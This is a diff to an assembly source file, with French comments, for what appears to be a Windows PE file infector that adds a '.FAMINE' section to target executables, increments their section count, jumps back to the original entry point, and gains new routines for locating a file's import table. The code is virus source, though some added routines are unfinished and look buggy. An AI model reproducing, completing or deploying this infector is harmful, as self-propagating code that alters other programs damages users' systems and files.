@@ -34,16 +34,6 @@ main proc
 		push rbp
 		mov rbp, rsp
 
-		cmp BYTE ptr [MUST_EXIT], 1
-		je apres
-
-		pop rbp
-		call get_rip
-		sub rax, 13h
-		sub rax, qword ptr [ENTRY_POINT]
-		jmp rax
-
-		apres:
 		push RAX
 		push RBX
 		push RCX
@@ -97,11 +87,12 @@ main proc
 		pop RBX
 		pop RAX
 		
-		test BYTE ptr [MUST_EXIT], 1
-		jne stop
+		cmp BYTE ptr [MUST_EXIT], 1
+		je stop
 
 		pop rbp
-		mov rax, debut_main
+		call get_rip
+		sub rax, 90h
 		sub rax, qword ptr [ENTRY_POINT]
 		jmp rax
 
@@ -127,7 +118,7 @@ SECTION_NAME db '.FAMINE',0
 ; 60 - 64	: size_of_main 
 ; 56 - 60	: Addresse virtuelle de notre code
 ; 48 - 56	: nbr of bytes read 
-; 40 - 48	: rsp - 64
+; 40 - 48	: rsp - 64 // HeapAlloc ?
 ; 32 - 40	: params
 ; 00 - 32	: shadow
 ; rsp
@@ -188,13 +179,17 @@ handle_file proc ; int handle
 	test r13, qword ptr [rsp+48]
 	je ret_failure
 
+	mov rcx, qword ptr [rsp + 40]
+	mov rdx, r13
+	call init_imports ; On fait les imports
+
 	mov rax, qword ptr [rsp + 40]
 	add rax, 3Ch
 	xor rdx, rdx
 	mov edx, dword ptr [rax] ; on saute le MS DOS header 
-
 	mov rax, qword ptr [rsp + 40]
 	add rax, rdx
+
 	add rax, 6
 	mov cx, word ptr [rax] ; cx = OldNumberOfSections
 	inc word ptr [rax] ; NumberOfSections++
@@ -337,7 +332,6 @@ ret_failure:
 	pop rbp
 	ret
 handle_file endp
-
 
 ; rbp
 ; 70 - 80		: padding
@@ -556,7 +550,6 @@ get_rip proc
 	mov rbp, rsp
 
 	mov rax, [rsp + 8]
-	;bswap rax
 
 	mov rsp, rbp
 	pop rbp
@@ -566,6 +559,64 @@ get_rip endp
 proc_nt_create_file proc
 jmp [qword ptr infect_folder]
 proc_nt_create_file endp
+
+; rbp
+; 40 - 48   : taille du fichier
+; 32 - 40	: void *fichier
+; 00 - 32	: shadow
+; rsp
+
+init_imports proc ; void init_imports(void *fichier, int taille_du_ficher)
+	push rbp
+	mov rbp, rsp
+	sub rsp, 48
+
+	mov qword ptr [rsp + 32], rcx
+	mov qword ptr [rsp + 40], rdx ; on sauvegarde les parametres
+
+	mov rax, rcx
+	add rax, 3ch
+	xor rdx, rdx
+	mov edx, dword ptr [rax] ; o saute le header DOS
+	mov rax, rcx
+	add rax, rdx
+
+	add rax, 4
+	mov rcx, rax
+	mov rdx, qword ptr [rsp + 40]
+	call get_idata_values
+
+	add rax, 8ch ; Champ import directory rva
+
+
+	mov rsp, rbp
+	pop rbp
+	ret
+
+init_imports endp
+
+get_idata_values proc ; get_idata_values(void *file_header, int taille_du_fichier). Retourne VirtualAddress dans rcx, et PointerToRawData dans rdx
+	push rbp
+	mov rbp, rsp
+	sub rsp, 32
+
+	; sections = file header + sizeof(file_header) + SizeOfOptionalHeader
+	mov rax, rcx
+	add rax, 10h
+	xor rbx, rbx
+	mov bx, word ptr [rax]
+	add rax, rbx
+	add rax, 4
+
+	xor rbp, rbx
+	mov ebx, 00006174h
+	rol rbx, 32
+	mov ebx, 6164692eh
+	cmp qword ptr [rax], rbx
+
+	mov rsp, rbp
+	pop rbp
+get_idata_values  endp
 
 label_fin:
 end
